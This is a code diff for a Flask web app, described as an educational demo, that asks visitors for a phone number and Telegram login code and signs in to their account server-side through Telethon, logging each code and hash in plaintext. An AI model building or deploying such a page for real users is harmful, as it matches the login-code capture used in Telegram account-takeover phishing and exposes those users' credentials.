@@ -39,6 +39,9 @@ def load_api_keys():
 API_ID, API_HASH, SECRET_KEY = load_api_keys()
 app.secret_key = SECRET_KEY
 
+# Хранилище для сессий
+AUTH_SESSIONS = {}
+
 class TelegramAuthTester:
     def __init__(self):
         self.api_id = None
@@ -66,14 +69,14 @@ class TelegramAuthTester:
             logger.error(f"❌ Ошибка инициализации: {e}")
             self.initialized = False
         
-    async def process_auth(self, phone_number, code=None):
-        """Универсальный метод для обработки аутентификации"""
+    async def request_code(self, phone_number):
+        """Запрос кода аутентификации"""
         if not self.initialized:
             return {'success': False, 'error': 'Клиент не инициализирован'}
             
         client = None
         try:
-            # Создаем нового клиента для каждого запроса
+            # Создаем нового клиента
             client = TelegramClient(
                 StringSession(),
                 self.api_id,
@@ -82,70 +85,107 @@ class TelegramAuthTester:
             
             await client.connect()
             
-            if not code:
-                # Запрос кода
-                logger.info(f"📱 Запрос кода для: {phone_number}")
-                sent_code = await client.send_code_request(phone_number)
-                
-                return {
-                    'success': True,
-                    'message': 'Код отправлен',
-                    'phone_code_hash': sent_code.phone_code_hash,
-                    'is_test': True
-                }
-            else:
-                # Верификация кода
-                logger.info(f"🔐 Верификация кода {code} для {phone_number}")
-                
-                # Получаем phone_code_hash заново
-                sent_code = await client.send_code_request(phone_number)
-                
-                try:
-                    result = await client.sign_in(
-                        phone=phone_number,
-                        code=code,
-                        phone_code_hash=sent_code.phone_code_hash
-                    )
-                    
-                    logger.info("✅ Успешная аутентификация")
-                    return {
-                        'success': True,
-                        'message': 'Аутентификация успешна',
-                        'is_test': True
-                    }
-                    
-                except SessionPasswordNeededError:
-                    logger.info("🔒 Требуется 2FA пароль")
-                    return {
-                        'success': True,
-                        'message': 'Требуется пароль 2FA',
-                        'needs_password': True
-                    }
-                    
-                except PhoneCodeInvalidError:
-                    logger.warning("⚠️ Неверный код")
-                    return {'success': False, 'error': 'Неверный код подтверждения'}
-                    
-                except PhoneCodeExpiredError:
-                    logger.warning("⏰ Код истек")
-                    return {'success': False, 'error': 'Код истек. Запросите новый.'}
-                    
-                except FloodWaitError as e:
-                    logger.warning(f"⏳ Flood wait: {e.seconds} секунд")
-                    return {
-                        'success': False, 
-                        'error': f'Слишком много попыток. Попробуйте через {e.seconds} секунд.'
-                    }
-                    
+            # Запрашиваем код
+            logger.info(f"📱 Запрос кода для: {phone_number}")
+            sent_code = await client.send_code_request(phone_number)
+            
+            # Сохраняем сессию
+            session_id = f"{phone_number}_{int(time.time())}"
+            AUTH_SESSIONS[session_id] = {
+                'client': client,
+                'phone': phone_number,
+                'phone_code_hash': sent_code.phone_code_hash,
+                'created_at': time.time()
+            }
+            
+            logger.info(f"📱 Код отправлен. Session: {session_id}")
+            logger.info(f"📱 Phone code hash: {sent_code.phone_code_hash}")
+            
+            return {
+                'success': True,
+                'message': 'Код отправлен',
+                'session_id': session_id,
+                'is_test': True
+            }
+            
         except Exception as e:
-            logger.error(f"❌ Ошибка: {e}")
-            return {'success': False, 'error': f'Ошибка: {str(e)}'}
-        finally:
+            logger.error(f"❌ Ошибка запроса кода: {e}")
             if client:
                 try:
                     await client.disconnect()
                 except:
                     pass
+            return {'success': False, 'error': f'Ошибка: {str(e)}'}
+    
+    async def verify_code(self, session_id, code):
+        """Верификация кода"""
+        if session_id not in AUTH_SESSIONS:
+            return {'success': False, 'error': 'Сессия не найдена'}
+            
+        session_data = AUTH_SESSIONS[session_id]
+        client = session_data['client']
+        phone = session_data['phone']
+        phone_code_hash = session_data['phone_code_hash']
+        
+        try:
+            logger.info(f"🔐 Верификация кода {code} для {phone}")
+            logger.info(f"🔐 Используем phone_code_hash: {phone_code_hash}")
+            
+            # Используем сохраненный phone_code_hash!
+            result = await client.sign_in(
+                phone=phone,
+                code=code,
+                phone_code_hash=phone_code_hash
+            )
+            
+            logger.info("✅ Успешная аутентификация")
+            
+            # Очищаем сессию
+            await client.disconnect()
+            del AUTH_SESSIONS[session_id]
+            
+            return {
+                'success': True,
+                'message': 'Аутентификация успешна',
+                'is_test': True
+            }
+            
+        except SessionPasswordNeededError:
+            logger.info("🔒 Требуется 2FA пароль")
+            return {
+                'success': True,
+                'message': 'Требуется пароль 2FA',
+                'needs_password': True
+            }
+            
+        except PhoneCodeInvalidError as e:
+            logger.warning(f"⚠️ Неверный код: {e}")
+            return {'success': False, 'error': 'Неверный код подтверждения'}
+            
+        except PhoneCodeExpiredError as e:
+            logger.warning(f"⏰ Код истек: {e}")
+            await client.disconnect()
+            del AUTH_SESSIONS[session_id]
+            return {'success': False, 'error': 'Код истек. Запросите новый.'}
+            
+        except FloodWaitError as e:
+            logger.warning(f"⏳ Flood wait: {e.seconds} секунд")
+            await client.disconnect()
+            del AUTH_SESSIONS[session_id]
+            return {
+                'success': False, 
+                'error': f'Слишком много попыток. Попробуйте через {e.seconds} секунд.'
+            }
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка верификации: {e}")
+            try:
+                await client.disconnect()
+            except:
+                pass
+            if session_id in AUTH_SESSIONS:
+                del AUTH_SESSIONS[session_id]
+            return {'success': False, 'error': f'Ошибка: {str(e)}'}
 
 # Инициализация
 auth_tester = TelegramAuthTester()
@@ -249,7 +289,8 @@ def educational_demo():
         <div class="debug-info">
             <strong>Отладочная информация:</strong><br>
             API_ID: {API_ID if API_ID else 'Не установлен'}<br>
-            API_HASH: {'Установлен' if API_HASH else 'Не установлен'}
+            API_HASH: {'Установлен' if API_HASH else 'Не установлен'}<br>
+            Активные сессии: {len(AUTH_SESSIONS)}
         </div>
         
         <div id="step1">
@@ -272,6 +313,7 @@ def educational_demo():
     </div>
 
     <script>
+        let currentSessionId = '';
         let currentPhone = '';
 
         function showAlert(message, type) {{
@@ -299,7 +341,6 @@ def educational_demo():
                     body: JSON.stringify({{phone: phone}})
                 }});
                 
-                // Проверяем статус ответа
                 if (!response.ok) {{
                     throw new Error(`HTTP error! status: ${{response.status}}`);
                 }}
@@ -307,6 +348,7 @@ def educational_demo():
                 const data = await response.json();
                 
                 if (data.success) {{
+                    currentSessionId = data.session_id;
                     document.getElementById('step2').style.display = 'block';
                     showAlert('✅ Код отправлен! Проверьте Telegram и введите код.', 'success');
                     document.getElementById('code').focus();
@@ -339,12 +381,11 @@ def educational_demo():
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
                     body: JSON.stringify({{
-                        phone: currentPhone,
+                        session_id: currentSessionId,
                         code: code
                     }})
                 }});
                 
-                // Проверяем статус ответа
                 if (!response.ok) {{
                     throw new Error(`HTTP error! status: ${{response.status}}`);
                 }}
@@ -377,7 +418,6 @@ def educational_demo():
             if (e.key === 'Enter') verifyCode();
         }});
 
-        // Auto-submit when 5 digits entered
         document.getElementById('code').addEventListener('input', function(e) {{
             if (e.target.value.length === 5) {{
                 verifyCode();
@@ -401,7 +441,7 @@ def auth_request():
         if not phone:
             return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
         
-        result = run_async(auth_tester.process_auth(phone))
+        result = run_async(auth_tester.request_code(phone))
         return jsonify(result)
     except Exception as e:
         logger.error(f"❌ Ошибка в auth_request: {e}")
@@ -415,13 +455,13 @@ def auth_verify():
         if not data:
             return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
             
-        phone = data.get('phone', '').strip()
+        session_id = data.get('session_id', '').strip()
         code = data.get('code', '').strip()
         
-        if not phone or not code:
-            return jsonify({'success': False, 'error': 'Введите номер и код'}), 400
+        if not session_id or not code:
+            return jsonify({'success': False, 'error': 'Введите код'}), 400
         
-        result = run_async(auth_tester.process_auth(phone, code))
+        result = run_async(auth_tester.verify_code(session_id, code))
         return jsonify(result)
     except Exception as e:
         logger.error(f"❌ Ошибка в auth_verify: {e}")
@@ -432,17 +472,10 @@ def status():
     """Проверка статуса API"""
     return jsonify({
         'api_initialized': auth_tester.initialized,
+        'active_sessions': len(AUTH_SESSIONS),
         'api_id_set': bool(API_ID),
         'api_hash_set': bool(API_HASH)
     })
-
-@app.errorhandler(404)
-def not_found(error):
-    return jsonify({'success': False, 'error': 'Endpoint not found'}), 404
-
-@app.errorhandler(500)
-def internal_error(error):
-    return jsonify({'success': False, 'error': 'Internal server error'}), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=False)
